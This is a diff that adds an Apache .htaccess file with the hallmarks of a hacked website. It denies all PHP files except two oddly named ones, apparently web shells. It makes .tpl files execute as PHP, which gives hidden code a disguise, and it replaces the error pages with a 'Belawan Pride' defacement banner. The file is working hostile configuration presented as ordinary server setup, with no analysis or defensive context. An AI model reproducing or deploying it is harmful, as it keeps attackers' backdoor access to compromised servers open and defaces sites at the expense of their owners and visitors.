@@ -1,0 +1,41 @@
+Deny from all
+<FilesMatch "(?i)\.(phtml|php|phar|pgif|pht|phtm|shtml|inc|php1|php2|php3|php4|php5|php56|php6|php7|php72|php8|php9|php[0-9]?|asp[x]?|)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|pdf|xml|txt|js|css|tpl|doc|docs|dxc)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+<FilesMatch '^(kongkek.php|6965ee7b873a2.shtML)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^\.">
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+
+ErrorDocument 403 '<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhw7yTf6zTuInz5XowNQLaYf0rrxWSTGVTadn5wScF72OOydw7aa-tdHAHskT-oz3PSNGfanqRykPbGJBz41-43EgiBO8dfWUmjf3gXe_bBqniY67QArJ1voheV70-Fv2wpZdKrRcROH1CGZlL3PAG6c1sCPIqM7_INCqxNeGUgyz6pKvyGpiXrvYUly1sz/s500/ChatGPT_Image_Oct_20__2025__06_50_53_AM-removebg-preview.png"><h3>Belawan Pride</h3></center>'
+ErrorDocument 404 '<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhw7yTf6zTuInz5XowNQLaYf0rrxWSTGVTadn5wScF72OOydw7aa-tdHAHskT-oz3PSNGfanqRykPbGJBz41-43EgiBO8dfWUmjf3gXe_bBqniY67QArJ1voheV70-Fv2wpZdKrRcROH1CGZlL3PAG6c1sCPIqM7_INCqxNeGUgyz6pKvyGpiXrvYUly1sz/s500/ChatGPT_Image_Oct_20__2025__06_50_53_AM-removebg-preview.png"><h3>Belawan Pride</h3></center>'
+
+AddType application/x-httpd-php .tpl
